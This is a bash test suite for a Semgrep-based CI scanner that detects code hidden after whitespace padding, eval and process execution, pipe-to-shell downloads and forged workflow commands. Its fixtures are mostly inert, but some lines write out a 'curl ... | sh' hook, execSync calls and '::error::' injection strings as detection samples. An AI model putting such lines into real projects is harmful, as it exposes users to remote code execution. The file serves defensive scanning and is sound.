#!/usr/bin/env bash
# Run scan.sh against the fixtures in testdata/ and check that code hidden
# after a run of whitespace fails the scan however the file is hidden or
# ignored, that clean code passes, and that a broken rule is a scanner error
# rather than a pass. Needs semgrep (see install-semgrep.sh), git, and
# python3 on PATH.
#
# The injected fixture is inert: a long line of no-op statements. Fixture
# files that end in .fixture lose the suffix when a case copies them, so that
# linters and update bots ignore them.
set -euo pipefail

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
test_root=$(mktemp -d "${TMPDIR:-/tmp}/code-scan-tests.XXXXXX")
trap 'rm -rf "$test_root"' EXIT
# Stop Git from finding a repository above the temporary directory.
export GIT_CEILING_DIRECTORIES=$test_root

passed=0
failed=0
output=

git_init() {
  git -C "$1" init -q
  git -C "$1" add -A
  git -C "$1" -c user.name=test -c user.email=test@example.com commit -q -m fixture
}

# prepare NAME FIXTURE copies FIXTURE (a directory under testdata/, or empty)
# to a fresh case directory and drops the .fixture suffixes.
prepare() {
  local dir=$test_root/$1 file
  mkdir -p "$dir"
  if [[ -n $2 ]]; then
    cp -R "$script_dir/testdata/$2/." "$dir/"
    while IFS= read -r -d '' file; do
      mv "$file" "${file%.fixture}"
    done < <(find "$dir" -name '*.fixture' -not -path '*/.git/*' -print0)
  fi
}

# run_case NAME FIXTURE EXPECTED_EXIT [VAR=value ...]
# Scans the case directory prepared by `prepare NAME FIXTURE` (called here
# unless the directory already exists, so a case can adjust it first).
run_case() {
  local name=$1 fixture=$2 expected=$3 dir status
  shift 3
  dir=$test_root/$name
  [[ -d $dir ]] || prepare "$name" "$fixture"
  [[ -d $dir/.git ]] || git_init "$dir"
  set +e
  output=$( (
    export SCAN_PATH=$dir RESULTS_FILE=$dir.json
    for assignment in "$@"; do export "${assignment?}"; done
    bash "$script_dir/scan.sh"
  ) 2>&1)
  status=$?
  set -e
  if [[ $status -eq $expected ]]; then
    report "$name" true "exit $status"
  else
    report "$name" false "exit $status, want $expected"
  fi
}

report() {
  if [[ $2 == true ]]; then
    passed=$((passed + 1))
    printf 'ok   %s: %s\n' "$1" "$3"
  else
    failed=$((failed + 1))
    printf 'FAIL %s: %s\n' "$1" "$3"
    printf '%s\n' "$output" | sed 's/^/     | /'
  fi
}

expect_output() {
  local name=$1 needle
  shift
  for needle in "$@"; do
    if grep -qF -- "$needle" <<< "$output"; then
      report "$name" true "output has '$needle'"
    else
      report "$name" false "output lacks '$needle'"
    fi
  done
}

# expect_findings NAME 'RULE PATH[:LINE]'... checks that each pair has an
# annotation: the path (and line, when given) in its file= and line=
# properties and the rule id in its title.
expect_findings() {
  local name=$1 pair rule path location
  shift
  for pair in "$@"; do
    rule=${pair%% *}
    path=${pair#* }
    if [[ $path =~ ^(.*):([0-9]+)$ ]]; then
      location="::error file=${BASH_REMATCH[1]},line=${BASH_REMATCH[2]},"
    else
      location="::error file=$path,line="
    fi
    if grep -F -- "$location" <<< "$output" | grep -qF -- "title=Code scan ($rule)"; then
      report "$name" true "annotation for $rule at $path"
    else
      report "$name" false "no annotation for $rule at $path"
    fi
  done
}

# expect_no_finding NAME 'RULE PATH'... checks that no annotation names RULE
# at PATH.
expect_no_finding() {
  local name=$1 pair rule path
  shift
  for pair in "$@"; do
    rule=${pair%% *}
    path=${pair#* }
    if grep -F -- "::error file=$path,line=" <<< "$output" | grep -qF -- "title=Code scan ($rule)"; then
      report "$name" false "unexpected annotation for $rule at $path"
    else
      report "$name" true "no annotation for $rule at $path"
    fi
  done
}

# expect_no_line_matching NAME REGEX checks that no output line matches.
expect_no_line_matching() {
  if grep -qE -- "$2" <<< "$output"; then
    report "$1" false "an output line matches '$2'"
  else
    report "$1" true "no output line matches '$2'"
  fi
}

# payload_line [SUFFIX] prints code, 300 spaces, and then an inert no-op
# statement, like the injected line in the real incident.
payload_line() {
  printf '];%300s%s\n' '' "void 'inert';${1:-}"
}

run_case clean clean 0

run_case injected-eslint injected-eslint 1
expect_findings injected-eslint 'hidden-code-after-whitespace eslint.config.mjs'
# The fixture line trips two rules, so it gets two annotations; the one for
# hidden code stays bounded (rule message + 200 characters of code) however much
# padding the line carries.
hidden=$(grep -F 'title=Code scan (hidden-code-after-whitespace)' <<< "$output" || true)
annotations=$(grep -c '^::error file=eslint.config.mjs,line=' <<< "$hidden" || true)
longest=$(grep '^::error file=eslint.config.mjs,line=' <<< "$hidden" | awk '{ if (length($0) > max) max = length($0) } END { print max + 0 }')
if [[ $annotations -eq 1 && $longest -lt 500 ]]; then
  report injected-eslint-annotation true "one annotation, $longest characters"
else
  report injected-eslint-annotation false "$annotations annotations, longest $longest characters"
fi

# More than a megabyte of ordinary code, then the padded payload.
prepare injected-large-file clean
python3 - "$test_root/injected-large-file/big.config.mjs" <<'PY'
import sys
with open(sys.argv[1], "w") as f:
    for i in range(40000):
        f.write(f"export const value{i} = {i} + 1;\n")
    f.write("];" + " " * 300 + "void 'inert';\n")
PY
run_case injected-large-file clean 1
expect_output injected-large-file hidden-code-after-whitespace big.config.mjs

prepare injected-semgrepignore injected-eslint
echo eslint.config.mjs > "$test_root/injected-semgrepignore/.semgrepignore"
run_case injected-semgrepignore injected-eslint 1

# Semgrep skips tests/, vendor/ and *.min.js by default; this scan does not.
prepare injected-default-ignored clean
mkdir -p "$test_root/injected-default-ignored/tests"
payload_line > "$test_root/injected-default-ignored/tests/setup.js"
payload_line > "$test_root/injected-default-ignored/app.min.js"
run_case injected-default-ignored clean 1
expect_output injected-default-ignored tests/setup.js app.min.js

# Nested node_modules directories and lockfile names are scanned.
prepare injected-nested-excludes clean
dir=$test_root/injected-nested-excludes
mkdir -p "$dir/src/node_modules/h"
payload_line > "$dir/src/node_modules/h/index.js"
payload_line > "$dir/src/helper.lock"
payload_line > "$dir/bun.lock"
run_case injected-nested-excludes clean 1
expect_output injected-nested-excludes src/node_modules/h/index.js src/helper.lock bun.lock

# CI installs nothing, so a file in the root node_modules was committed, and a
# later pull would overwrite the developer's installed copy with it.
prepare root-node-modules-scanned clean
mkdir -p "$test_root/root-node-modules-scanned/node_modules/@eslint/js/src"
payload_line > "$test_root/root-node-modules-scanned/node_modules/@eslint/js/src/index.js"
run_case root-node-modules-scanned clean 1
expect_findings root-node-modules-scanned 'hidden-code-after-whitespace node_modules/@eslint/js/src/index.js:1'
# A local run can still skip an installed tree.
prepare root-node-modules-excluded clean
mkdir -p "$test_root/root-node-modules-excluded/node_modules/h"
payload_line > "$test_root/root-node-modules-excluded/node_modules/h/index.js"
run_case root-node-modules-excluded clean 0 EXCLUDE_PATHS=/node_modules

# Tracked files that .gitignore lists are still scanned.
prepare injected-gitignored-tracked injected-eslint
git_init "$test_root/injected-gitignored-tracked"
echo eslint.config.mjs > "$test_root/injected-gitignored-tracked/.gitignore"
git -C "$test_root/injected-gitignored-tracked" add .gitignore
git -C "$test_root/injected-gitignored-tracked" -c user.name=test -c user.email=test@example.com commit -q -m ignore
run_case injected-gitignored-tracked injected-eslint 1

# A file that does not parse still gets the regex rule.
prepare injected-unparseable clean
{
  echo 'const = = ;;; {'
  payload_line
} > "$test_root/injected-unparseable/broken.js"
run_case injected-unparseable clean 1

# Semgrep's regex rules match nothing in a file that is not valid UTF-8, so
# one Latin-1 byte would hide the incident payload. The pre-pass flags the
# file instead, at the line of the first bad byte.
prepare non-utf8-injected injected-eslint
python3 - "$test_root/non-utf8-injected/eslint.config.mjs" <<'PY'
import sys
path = sys.argv[1]
with open(path, "rb") as f:
    data = f.read()
with open(path, "wb") as f:
    f.write(b"// Copyright \xa9 Datum\n" + data)
PY
run_case non-utf8-injected injected-eslint 1
expect_findings non-utf8-injected 'non-utf8-text eslint.config.mjs:1'

prepare non-utf8-line clean
printf 'const a = 1;\nconst b = 2;\n// caf\xe9\n' > "$test_root/non-utf8-line/latin1.js"
printf 'echo hi # \xff\n' > "$test_root/non-utf8-line/run.sh"
run_case non-utf8-line clean 1
expect_findings non-utf8-line 'non-utf8-text latin1.js:3' 'non-utf8-text run.sh:1'

# A binary file (a NUL byte in its first 8 KB, git's test) is not text.
prepare non-utf8-binary clean
printf 'GIF89a\001\000\001\000\200\377\251\000;' > "$test_root/non-utf8-binary/logo.gif"
run_case non-utf8-binary clean 0

# A NUL byte doesn't make a code or text file binary: Node still runs the
# file, so the NUL can't buy an exemption from the UTF-8 check.
prepare nul-text-injected injected-eslint
python3 - "$test_root/nul-text-injected/eslint.config.mjs" <<'PY2'
import sys
with open(sys.argv[1], "wb") as f:
    f.write(b"/*\x00*/ // Copyright \xa9 Datum\n" + b"export default [];" + b" " * 150 + b"void 0;\n")
PY2
run_case nul-text-injected injected-eslint 1
expect_findings nul-text-injected 'non-utf8-text eslint.config.mjs:1'

# A NUL byte in otherwise valid UTF-8 code is a finding of its own; a real
# binary with a NUL byte and invalid UTF-8 isn't.
prepare nul-text clean
printf 'const a = 1;
const b = "\000";
' > "$test_root/nul-text/nul.js"
printf '\211PNG\r\n\032\n\000\000\000\rIHDR\377\251' > "$test_root/nul-text/logo.png"
printf '# Notes\n\ncaf\351\n' > "$test_root/nul-text/NOTES.md"
run_case nul-text clean 1
expect_findings nul-text 'nul-in-text-file nul.js:2' 'non-utf8-text NOTES.md:3'
expect_no_finding nul-text 'non-utf8-text logo.png' 'nul-in-text-file logo.png'

# Node loads a symlink target as the link's type, so the target gets the
# text check whatever its own name. The finding is on both paths.
prepare nul-symlink clean
python3 - "$test_root/nul-symlink/payload.dat" <<'PY2'
import sys
with open(sys.argv[1], "wb") as f:
    f.write(b"/*\x00*/ // \xa9\nmodule.exports = [];" + b" " * 150 + b"void 0;\n")
PY2
ln -s payload.dat "$test_root/nul-symlink/eslint.config.cjs"
run_case nul-symlink clean 1
expect_findings nul-symlink 'non-utf8-text payload.dat:1' 'non-utf8-text eslint.config.cjs:1'

# Husky v9 hooks have no shebang, and sh runs them anyway: files the
# download-pipe-to-shell rule reads by path are text too.
prepare nul-hook clean
mkdir -p "$test_root/nul-hook/.husky"
printf 'echo lint\n#\000 \251\ncurl -s https://x.example/i | sh\n' > "$test_root/nul-hook/.husky/pre-commit"
run_case nul-hook clean 1
expect_findings nul-hook 'non-utf8-text .husky/pre-commit:2'

# prescan.py's list of paths that are text by location must match the
# download-pipe-to-shell rule's path includes.
if python3 - "$script_dir" <<'PY2'
import re, sys
sys.path.insert(0, sys.argv[1])
import prescan
rule = open(sys.argv[1] + "/rules/download-pipe-to-shell.yaml").read()
block = rule.split("include:", 1)[1].split("- id:", 1)[0]
globs = re.findall(r"^\s+- '([^']+)'$", block, re.M)
sys.exit(0 if globs and set(globs) == set(prescan.TEXT_PATH_GLOBS) else 1)
PY2
then
  report text-globs-in-sync true "prescan.TEXT_PATH_GLOBS matches the rule's includes"
else
  report text-globs-in-sync false "prescan.TEXT_PATH_GLOBS differs from download-pipe-to-shell's includes"
fi

# The pre-pass reads Semgrep's target list from JSON, so a newline in a file
# name doesn't split it, and the annotation escapes the newline.
prepare prescan-odd-name clean
printf '// caf\351\n' > "$test_root/prescan-odd-name/$(printf 'odd\nname.js')"
run_case prescan-odd-name clean 1
expect_output prescan-odd-name '::error file=odd%0Aname.js,line=1,title=Code scan (non-utf8-text)'

# The finding is suppressible per path like any other.
prepare non-utf8-ignored clean
printf '// caf\xe9\n' > "$test_root/non-utf8-ignored/legacy.js"
mkdir -p "$test_root/non-utf8-ignored/.github"
entry_toml='[[Ignore]]
rule = "non-utf8-text"
path = "legacy.js"
reason = "Latin-1 comment in a vendored file"
ignoreUntil = 2027-04-30'
printf '%s\n' "$entry_toml" > "$test_root/non-utf8-ignored/.github/code-scan-ignore.toml"
run_case non-utf8-ignored clean 0 TODAY=2026-10-29
expect_output non-utf8-ignored 'suppressed: non-utf8-text legacy.js'

# An inline nosemgrep comment does not suppress the finding.
prepare nosem-ignored clean
payload_line ' // nosemgrep' > "$test_root/nosem-ignored/nosem.js"
run_case nosem-ignored clean 1

# A rule file that does not load is a scanner error, not a pass.
mkdir -p "$test_root/bad-rules"
printf 'rules:\n  - id: broken\n    languages: [generic]\n' > "$test_root/bad-rules/bad.yaml"
run_case scanner-error clean 2 RULES_DIR="$test_root/bad-rules"

# Excluding every file leaves nothing scanned, which is a configuration
# error, not a pass.
run_case nothing-scanned injected-eslint 2 'EXCLUDE_PATHS=**'
expect_output nothing-scanned 'scanned no files'

# Leading indentation is not hidden code.
prepare indent-not-flagged clean
printf '%120sconst x = 1;\n' '' > "$test_root/indent-not-flagged/indented.js"
run_case indent-not-flagged clean 0

# Padding made of other whitespace hides code just as well: Unicode spaces,
# form feed and vertical tab, zero-width and blank-looking characters, and
# tabs, which an editor shows 8 columns wide. Each file pads the payload with
# one kind, on line 2.
prepare hidden-padding clean
python3 - "$test_root/hidden-padding" <<'PY'
import os, sys
root = sys.argv[1]
cases = {
    "nbsp.js": " " * 300,
    "ideographic.js": "　" * 300,
    "em-space.js": " " * 300,
    "form-feed.js": "\f" * 300,
    "vertical-tab.js": "\v" * 300,
    "bom.js": "﻿" * 300,
    "zero-width.js": "​" * 300,
    "mixed.js": "  " * 150,
    "tabs.js": "\t" * 50,
    "tabs-13.js": "\t" * 13,
    "ideographic-50.js": "　" * 50,
}
for name, pad in cases.items():
    with open(os.path.join(root, name), "w", encoding="utf-8") as f:
        f.write("const a = 1;\n];" + pad + "void 0;\n")
with open(os.path.join(root, "braille-comment.js"), "w", encoding="utf-8") as f:
    f.write("const a = 1;\nx; // " + "⠀" * 300 + "void 0;\n")
with open(os.path.join(root, "hangul-string.js"), "w", encoding="utf-8") as f:
    f.write("const a = 1;\nconst s = '" + "ㅤ" * 300 + "'; void 0;\n")
PY
run_case hidden-padding clean 1
for file in nbsp ideographic em-space form-feed vertical-tab bom zero-width mixed tabs tabs-13 ideographic-50 \
  braille-comment hangul-string; do
  expect_findings hidden-padding "hidden-code-after-whitespace $file.js:2"
done
# The report collapses the padding, so the hidden code stays in view.
if grep -F '::error file=nbsp.js,line=2,' <<< "$output" | grep -qF 'void 0;'; then
  report hidden-padding-snippet true "the nbsp.js annotation shows the code after the padding"
else
  report hidden-padding-snippet false "the nbsp.js annotation lacks the code after the padding"
fi

# Indentation in any whitespace, and runs just under each threshold, are fine.
prepare hidden-padding-negative clean
python3 - "$test_root/hidden-padding-negative" <<'PY'
import os, sys
root = sys.argv[1]
lines = {
    "indent-ascii.js": " " * 120 + "const x = 1;",
    "indent-nbsp.js": " " * 120 + "const x = 1;",
    "indent-tabs.js": "\t" * 20 + "const x = 1;",
    "run-99.js": "x;" + " " * 99 + "void 0;",
    "run-99-nbsp.js": "x;" + " " * 99 + "void 0;",
    "tabs-12.js": "x;" + "\t" * 12 + "void 0;",
    "ideographic-49.js": "x;" + "　" * 49 + "void 0;",
}
for name, line in lines.items():
    with open(os.path.join(root, name), "w", encoding="utf-8") as f:
        f.write(line + "\n")
PY
run_case hidden-padding-negative clean 0

# Build-file lines over 500 characters; the same line elsewhere is fine.
run_case oversized-line-positive oversized-line/positive 1
expect_findings oversized-line-positive 'oversized-line-build-file vite.config.mjs' 'oversized-line-build-file scripts/build.mjs' \
  'oversized-line-build-file .husky/pre-push:2' 'oversized-line-build-file lefthook.yaml:4'
run_case oversized-line-negative oversized-line/negative 0

run_case dynamic-exec-positive dynamic-code-execution/positive 1
# Fixtures that hold several patterns are checked line by line, so one broken
# pattern can't hide behind another.
expect_findings dynamic-exec-positive 'dynamic-code-execution eval.js:2' \
  'dynamic-code-execution function.js:1' 'dynamic-code-execution function.js:2' 'dynamic-code-execution function.js:3' \
  'dynamic-code-execution vm.js:2' 'dynamic-code-execution vm.js:3' 'dynamic-code-execution vm.js:4' 'dynamic-code-execution vm.js:5' \
  'dynamic-code-execution vm-alias.js:1' 'dynamic-code-execution vm-compile.js:1' 'dynamic-code-execution vm-script.js:1' \
  'dynamic-code-execution indirect-eval.js:1' 'dynamic-code-execution global-eval.js:1' \
  'dynamic-code-execution window-eval.js:1' 'dynamic-code-execution alias-eval.js:1' \
  'dynamic-code-execution global-function.js:1' \
  'dynamic-code-execution ctor-function.js:1' 'dynamic-code-execution ctor-arrow.js:1' \
  'dynamic-code-execution ctor-method.js:1' 'dynamic-code-execution reflect-construct.js:1' \
  'dynamic-code-execution reflect-global.js:1'
run_case dynamic-exec-negative dynamic-code-execution/negative 0

run_case process-exec-positive process-execution/positive 1
expect_findings process-exec-positive 'process-execution cp.js:1' 'process-execution cp.js:2' 'process-execution cp.js:3' \
  'process-execution bun.ts:1' 'process-execution bun.ts:2' 'process-execution bun.ts:3' \
  'process-execution create-require.js' 'process-execution module-require.js' \
  'process-execution main-module.js' 'process-execution bun-destructure.ts' \
  'process-execution bun-index.ts'
# Semgrep reports the match on cp.js line 2 twice (two patterns, same rule
# and line); the report shows it once.
count=$(grep -c '^::error file=cp.js,line=2,' <<< "$output" || true)
if [[ $count -eq 1 ]]; then
  report process-exec-dedupe true "one annotation for cp.js:2"
else
  report process-exec-dedupe false "$count annotations for cp.js:2"
fi
run_case process-exec-negative process-execution/negative 0

run_case remote-execute-positive remote-fetch-then-execute/positive 1
expect_findings remote-execute-positive \
  'remote-fetch-then-execute text.js' 'remote-fetch-then-execute json.js' \
  'remote-fetch-then-execute axios.js' 'remote-fetch-then-execute require.js:3' 'remote-fetch-then-execute require.js:4' \
  'remote-fetch-then-execute https.js'
run_case remote-execute-negative remote-fetch-then-execute/negative 0

# Files Node runs that Semgrep doesn't treat as JavaScript by extension get
# the JavaScript rules through a second pass: .mts and .cts files, scripts
# with a node, bun, or deno shebang, and the targets of symlinks named like
# JavaScript files. payload.txt is reached only through the symlink.
prepare explicit-targets explicit-targets
ln -s payload.txt "$test_root/explicit-targets/link.config.cjs"
printf "require('child_process').execSync('true');\n" > "$test_root/explicit-targets-outside.js"
ln -s ../explicit-targets-outside.js "$test_root/explicit-targets/outside.config.js"
printf "require('child_process').execSync('true');\n" > "$test_root/explicit-targets/unlinked.txt"
run_case explicit-targets explicit-targets 1
expect_findings explicit-targets 'process-execution x.mts:1' 'process-execution x.cts:1' \
  'process-execution tool:2' 'process-execution bun-tool:2' 'process-execution deno-tool:2' \
  'process-execution payload.txt:1'
expect_no_finding explicit-targets 'process-execution unlinked.txt' 'process-execution shell-tool' \
  'process-execution outside.config.js'
# The standard payload matches process-execution twice on one line (columns
# 1 and 9); the report shows one annotation per rule and line.
count=$(grep -c '^::error file=x.mts,line=1,title=Code scan (process-execution)' <<< "$output" || true)
if [[ $count -eq 1 ]]; then
  report explicit-targets-dedupe true "one annotation for x.mts:1"
else
  report explicit-targets-dedupe false "$count annotations for x.mts:1"
fi
# The second pass honours the excludes.
run_case explicit-targets-excluded explicit-targets 1 'EXCLUDE_PATHS=x.mts,tool'
expect_findings explicit-targets-excluded 'process-execution x.cts:1'
expect_no_finding explicit-targets-excluded 'process-execution x.mts' 'process-execution tool'

# A require of a non-code file runs it as JavaScript. logo.gif is text that is
# also a GIF header; the scan reads it rather than skipping it as binary.
run_case require-non-code-positive require-non-code-file/positive 1
expect_findings require-non-code-positive 'require-non-code-file require-txt.js:1' \
  'require-non-code-file create-require.mjs:2' 'require-non-code-file create-require-call.mjs:1' \
  'require-non-code-file module-require.js:1' 'require-non-code-file import-md.ts:1' \
  'require-non-code-file dynamic-import.mjs:1' 'require-non-code-file export-from.ts:1' \
  'hidden-code-after-whitespace logo.gif:1'
run_case require-non-code-negative require-non-code-file/negative 0

# Markdown tables pad cells with long runs of spaces; MDX can hold code, so
# it stays in scope.
prepare markdown-padding clean
printf '| a%150s| b |\n' '' > "$test_root/markdown-padding/TABLE.md"
printf '| a%150s| b |\n' '' > "$test_root/markdown-padding/notes.markdown"
run_case markdown-padding clean 0
prepare mdx-padding clean
printf '| a%150s| b |\n' '' > "$test_root/mdx-padding/page.mdx"
run_case mdx-padding clean 1
expect_findings mdx-padding 'hidden-code-after-whitespace page.mdx:1'

# npm and bun run lifecycle scripts on install, so package.json script values
# get the code checks too, at any depth.
run_case package-script-positive package-script-exec/positive 1
expect_findings package-script-positive 'package-script-exec package.json:5' \
  'package-script-exec packages/tool/package.json:3' 'package-script-exec packages/tool/package.json:4' \
  'package-script-exec packages/tool/package.json:5'
run_case package-script-negative package-script-exec/negative 0

# Git LFS objects and submodules aren't in the checkout the scan reads, so
# their presence is a finding that needs an ignore entry.
prepare unscanned-lfs clean
printf '* text=auto\n*.bin filter=lfs diff=lfs merge=lfs -text\n' > "$test_root/unscanned-lfs/.gitattributes"
mkdir -p "$test_root/unscanned-lfs/assets"
printf '*.psd filter=lfs diff=lfs merge=lfs -text\n' > "$test_root/unscanned-lfs/assets/.gitattributes"
run_case unscanned-lfs clean 1
expect_findings unscanned-lfs 'unscanned-content .gitattributes:2' 'unscanned-content assets/.gitattributes:1'

prepare unscanned-attributes-ok clean
printf '* text=auto eol=lf\n*.png binary\n' > "$test_root/unscanned-attributes-ok/.gitattributes"
run_case unscanned-attributes-ok clean 0

prepare unscanned-submodule clean
printf '[submodule "lib"]\n\tpath = lib\n\turl = https://example.invalid/lib.git\n' > "$test_root/unscanned-submodule/.gitmodules"
run_case unscanned-submodule clean 1
expect_findings unscanned-submodule 'unscanned-content .gitmodules:1'

# A gitlink without a .gitmodules file is still a submodule.
prepare unscanned-gitlink clean
git_init "$test_root/unscanned-gitlink"
git -C "$test_root/unscanned-gitlink" update-index --add --cacheinfo "160000,$(git -C "$test_root/unscanned-gitlink" rev-parse HEAD),vendor/lib"
git -C "$test_root/unscanned-gitlink" -c user.name=test -c user.email=test@example.com commit -q -m gitlink
run_case unscanned-gitlink clean 1
expect_findings unscanned-gitlink 'unscanned-content vendor/lib:1'

prepare unscanned-ignored clean
printf '*.bin filter=lfs diff=lfs merge=lfs -text\n' > "$test_root/unscanned-ignored/.gitattributes"
mkdir -p "$test_root/unscanned-ignored/.github"
printf '[[Ignore]]\nrule = "unscanned-content"\npath = ".gitattributes"\nreason = "LFS holds design files only"\nignoreUntil = 2027-04-30\n' \
  > "$test_root/unscanned-ignored/.github/code-scan-ignore.toml"
run_case unscanned-ignored clean 0 TODAY=2026-10-29
expect_output unscanned-ignored 'suppressed: unscanned-content .gitattributes'

run_case pipe-to-shell-positive download-pipe-to-shell/positive 1
expect_findings pipe-to-shell-positive 'download-pipe-to-shell install.sh:2' 'download-pipe-to-shell install.sh:3' \
  'download-pipe-to-shell Dockerfile:2' 'download-pipe-to-shell .github/workflows/ci.yml:4' \
  'download-pipe-to-shell sudo.sh:2' 'download-pipe-to-shell tee.sh:2' \
  'download-pipe-to-shell subst.sh:2' 'download-pipe-to-shell procsubst.sh:2' \
  'download-pipe-to-shell curl-in-ts.ts:1' 'download-pipe-to-shell tool.bash:2' \
  'download-pipe-to-shell setup.zsh:1' 'download-pipe-to-shell .husky/pre-commit:3' \
  'download-pipe-to-shell lefthook.yml:4' 'download-pipe-to-shell-shebang bin/setup:4'
run_case pipe-to-shell-negative download-pipe-to-shell/negative 0

# Central ignore file. TODAY is pinned so expiry and the 12-month cap are
# deterministic (latest allowed date: 2027-10-29).
run_case ignored ignored 0 TODAY=2026-10-29
expect_output ignored 'suppressed: process-execution scripts/graphql.ts' 'codegen CLI'

# ignore_case NAME EXPECTED TOML writes TOML as the ignore file of a fresh
# copy of the ignored fixture and scans it.
ignore_case() {
  local name=$1 expected=$2
  prepare "$name" ignored
  printf '%s\n' "$3" > "$test_root/$name/.github/code-scan-ignore.toml"
  run_case "$name" ignored "$expected" TODAY=2026-10-29
}
entry() { # entry RULE PATH [EXTRA LINES...]
  printf '[[Ignore]]\nrule = "%s"\npath = "%s"\n' "$1" "$2"
  shift 2
  printf '%s\n' "$@"
}
ok_tail=('reason = "why"' 'ignoreUntil = 2027-04-30')

ignore_case ignore-other-path 1 "$(entry process-execution scripts/other.ts "${ok_tail[@]}")"
ignore_case ignore-glob-path 1 "$(entry process-execution 'scripts/*' "${ok_tail[@]}")"
ignore_case ignore-prefix-path 1 "$(entry process-execution scripts "${ok_tail[@]}")"
ignore_case ignore-other-rule 1 "$(entry dynamic-code-execution scripts/graphql.ts "${ok_tail[@]}")"
ignore_case ignore-no-reason 2 "$(entry process-execution scripts/graphql.ts 'ignoreUntil = 2027-04-30')"
expect_output ignore-no-reason 'entry #1' 'reason'
ignore_case ignore-typo-key 2 "$(entry process-execution scripts/graphql.ts 'reaso = "why"' 'reason = "why"' 'ignoreUntil = 2027-04-30')"
expect_output ignore-typo-key 'reaso'
ignore_case ignore-no-until 2 "$(entry process-execution scripts/graphql.ts 'reason = "why"')"
expect_output ignore-no-until 'ignoreUntil'
ignore_case ignore-too-far 2 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2027-11-29')"
expect_output ignore-too-far 'latest allowed date is 2027-10-29'
ignore_case ignore-at-cap 0 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2027-10-29')"
ignore_case ignore-string-date 0 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = "2027-04-30"')"
ignore_case ignore-bad-date 2 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = "soon"')"
ignore_case ignore-expired 1 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2026-10-28')"
expect_output ignore-expired expired
expect_findings ignore-expired 'process-execution scripts/graphql.ts'
ignore_case ignore-last-day 0 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2026-10-29')"
ignore_case ignore-malformed 2 'this is [not toml'
ignore_case ignore-empty 1 ''

# Reporting. The summary goes to $GITHUB_STEP_SUMMARY when set.
prepare summary-ignored ignored
summary=$test_root/summary-ignored.md
run_case summary-ignored ignored 0 TODAY=2026-10-29 "GITHUB_STEP_SUMMARY=$summary"
output=$(cat "$summary")
expect_output summary-ignored '## Code scan' '### Suppressed' 'Runs the GraphQL codegen CLI via child_process' \
  'curl \| sh' "add an entry to \` .github/code-scan-ignore.toml \`"
expect_no_line_matching summary-ignored '@datum-cloud'

# The help text names the ignore file the caller configured.
prepare summary-custom-ignore injected-eslint
summary=$test_root/summary-custom-ignore.md
run_case summary-custom-ignore injected-eslint 1 "GITHUB_STEP_SUMMARY=$summary" IGNORE_FILE=config/scan-ignore.toml
output=$(cat "$summary")
expect_output summary-custom-ignore "add an entry to \` config/scan-ignore.toml \`"
expect_no_line_matching summary-custom-ignore 'code-scan-ignore\.toml'

# Annotations name the file relative to the repository root, which is where
# GitHub draws them, even when path is a subdirectory.
prepare scan-subdir clean
mkdir -p "$test_root/scan-subdir/sub"
cp "$script_dir/testdata/injected-eslint/eslint.config.mjs.fixture" "$test_root/scan-subdir/sub/eslint.config.mjs"
run_case scan-subdir clean 1 "SCAN_PATH=$test_root/scan-subdir/sub"
expect_findings scan-subdir 'hidden-code-after-whitespace sub/eslint.config.mjs'

prepare summary-injected injected-eslint
summary=$test_root/summary-injected.md
run_case summary-injected injected-eslint 1 "GITHUB_STEP_SUMMARY=$summary"
output=$(cat "$summary")
expect_output summary-injected '## Code scan' '| Rule | Location | Message | Code |' 'hidden-code-after-whitespace' 'eslint.config.mjs:'

# Finding text is attacker-controlled: it must not forge workflow commands or
# break the summary table.
summary=$test_root/summary-injection.md
run_case injection-attempt injection-attempt 1 "GITHUB_STEP_SUMMARY=$summary"
expect_findings injection-attempt 'dynamic-code-execution payload.js'
expect_no_line_matching injection-attempt '^::(add-mask|stop-commands|error::)'
expect_no_line_matching injection-attempt '^::[a-z-]+::'
expect_output injection-attempt '%0A' '%0D' '%25' 'forged'
if python3 -c '
import re, sys
rows = [l for l in open(sys.argv[1]).read().split("\n") if l.startswith("|")]
cells = {len(re.findall(r"(?<!\\)\|", r)) for r in rows}
sys.exit(0 if rows and len(cells) == 1 else 1)' "$summary"; then
  report injection-summary-table true "every row has the same cells"
else
  report injection-summary-table false "table rows differ"
fi

# Ignore-file strings are attacker-influenceable too: a newline in an expired
# entry's rule or reason must not start a forged command.
ignore_case ignore-expired-injection 1 "$(entry 'process-execution\n::error::injected' scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2026-10-28')"
expect_output ignore-expired-injection expired '%0A::error::injected'
expect_no_line_matching ignore-expired-injection '^::error::injected'
ignore_case ignore-expired-reason-injection 1 "$(entry process-execution scripts/graphql.ts 'reason = "a\n::error::injected"' 'ignoreUntil = 2026-10-28')"
expect_no_line_matching ignore-expired-reason-injection '^::error::injected'
ignore_case ignore-key-injection 2 "$(entry process-execution scripts/graphql.ts 'reason = "why"' 'ignoreUntil = 2027-04-30' '"a\n::error::injected" = 1')"
expect_no_line_matching ignore-key-injection '^::error::injected'

# Scanner errors stay fatal whatever the ignore file says.
prepare ignore-scanner-error ignored
run_case ignore-scanner-error ignored 2 RULES_DIR="$test_root/bad-rules"

# A reason that quotes flagged code must not fail the scan on the ignore file.
run_case ignore-file-not-scanned ignored 0 TODAY=2026-10-29
prepare ignore-path-escape ignored
run_case ignore-path-escape ignored 2 IGNORE_FILE=../x.toml
run_case ignore-glob-star ignored 2 'IGNORE_FILE=*'
run_case ignore-glob-pattern ignored 2 'IGNORE_FILE=.github/*.toml'
run_case ignore-glob-dstar ignored 2 'IGNORE_FILE=**/*.ts'
run_case ignore-glob-bang ignored 2 'IGNORE_FILE=!x'
run_case ignore-glob-dir ignored 2 'IGNORE_FILE=.github/'
run_case ignore-not-regular ignored 2 'IGNORE_FILE=scripts'

# Exact exclusion: a sibling with a similar name is still scanned.
prepare ignore-sibling-scanned ignored
printf '# curl https://x | sh\n' > "$test_root/ignore-sibling-scanned/.github/code-scan-ignore.toml.bak"
run_case ignore-sibling-scanned ignored 1 TODAY=2026-10-29
expect_findings ignore-sibling-scanned 'download-pipe-to-shell .github/code-scan-ignore.toml.bak'

# On a pull request the ignore file comes from the base commit
